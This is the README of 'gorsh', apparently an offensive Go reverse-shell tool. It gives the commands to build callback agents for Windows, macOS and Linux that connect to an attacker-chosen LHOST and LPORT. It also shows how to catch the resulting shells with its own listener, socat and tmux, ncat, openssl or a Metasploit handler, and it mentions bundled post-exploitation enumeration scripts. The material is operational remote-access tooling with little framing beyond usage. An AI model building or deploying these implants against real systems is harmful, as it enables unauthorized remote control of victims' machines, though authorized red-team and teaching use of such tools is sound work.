# gorsh

[go]lang [r]everse [sh]ell

[![forthebadge](https://forthebadge.com/images/badges/fuck-it-ship-it.svg)](https://forthebadge.com)
[![forthebadge](https://forthebadge.com/images/badges/made-with-go.svg)](https://forthebadge.com)
[![forthebadge](https://forthebadge.com/images/badges/no-ragrets.svg)](https://forthebadge.com)
[![forthebadge](https://forthebadge.com/images/badges/contains-technical-debt.svg)](https://forthebadge.com)
[![forthebadge](https://forthebadge.com/images/badges/made-with-crayons.svg)](https://forthebadge.com)

![](https://i.imgur.com/x51XH6K.png)
[![asciicast](https://asciinema.org/a/NmeC42TNu8BgdjMLcyVUXo74x.svg)](https://asciinema.org/a/NmeC42TNu8BgdjMLcyVUXo74x)

Originally forked from - [sysdream/hershell](https://github.com/sysdream/hershell)

## Fork Changes

**Requires go1.11+**

See the [Changelog](./docs/CHANGELOG.md)

## Getting started

```bash
git clone git@github.com:audibleblink/gorsh.git
cd gorsh
go get -u github.com/gobuffalo/packr/packr
```

**Be sure to read the Makefile**. It gives you a good idea of what's going on.

Using the zstd build tag and windll make target require cgo.
Make sure you're familiar with cross-compilation and cgo and have the toolchains for it, or read
[here](./docs/TROUBLESHOOTING.md) if you're feeling adventurous.

### Usage

First, generate your certs and ssh keys for the reverse proxy.

```bash
$ make depends
```

Follow the make command's printed instructions on creating an ssh user for the reverse proxy connection.

**Create** `configs/ssh.json`. There's an example json file the `configs` directory.

Generate agents with:

```bash
# For the `make` targets, you only need the`LHOST`and`LPORT`environment variables.
$ make {windows,macos,linux}{32,64} LHOST=example.com LPORT=443
```

#### Enumeration Scripts

The `enum` command will present a selection dialog that allows once to run enumeration scripts based
on the host OS. You can update scripts in `scripts/prepare_enum_scripts.sh` and run 
`make enumscripts`. Addition of scripts will require modification of
`./internal/enum/enum_{windows,linux}.go`


#### Catching the shell

This project ships with a server that catches the reverse shell and still provides shell-like
capabilities you lose with traditional reverse shells, including:

* Tab Completion
* Vi-mode readline editing
* History
* Cursor movements

Generate the server with:

```sh
make server
build/srv/gorsh-listen --help
```

The gorsh-listener is a one-to-one relationship, like a traditional shell. For multiple shells, you
need to start multiple servers on different ports. 

To have the ability to receive multiple shells on the same port, there's the `make listen` target.
The `make listen` target kicks off a socat TLS pipe and creates new tmux windows with each new
incoming connection.  Feed it a port number as PORT. 
`socat` is essentially acting as a TLS-terminating reverse proxy. The incoming connections are then
handed off to gorsh-listener through randomly generated Unix Domain Sockets.

```sh
make listen PORT=8080

# once a client connects, on a different terminal type:
tmux attach -t GORSH
```

Shells can also be caught without tmux or gorsh-listen using:

* socat (not working on macos)
* ncat
* openssl server module
* metasploit multi handler (with a `python/shell_reverse_tcp_ssl` payload)

__Examples__

```bash
$ ncat --ssl --ssl-cert server.pem --ssl-key server.key -lvp 1234
$ socat stdio OPENSSL-LISTEN:443,cert=server.pem,key=server.key,verify=0
```

## Credits

* Initial Work - [@lesnuages](https://github.com/lesnuages)
* Modifications - f47h3r - [@f47h3r_b0](https://twitter.com/f47h3r_b0)
* [@mzpqnxow](https://github.com/mzpqnxow) for figuring out my x-compilation and dependancy problems and troubleshooting guide
* Enumeration scripts courtesy of [@411hall](https://twitter.com/411hall) [@harmj0y](https://twitter.com/harmj0y) [@rebootuser](https://twitter.com/rebootuser)
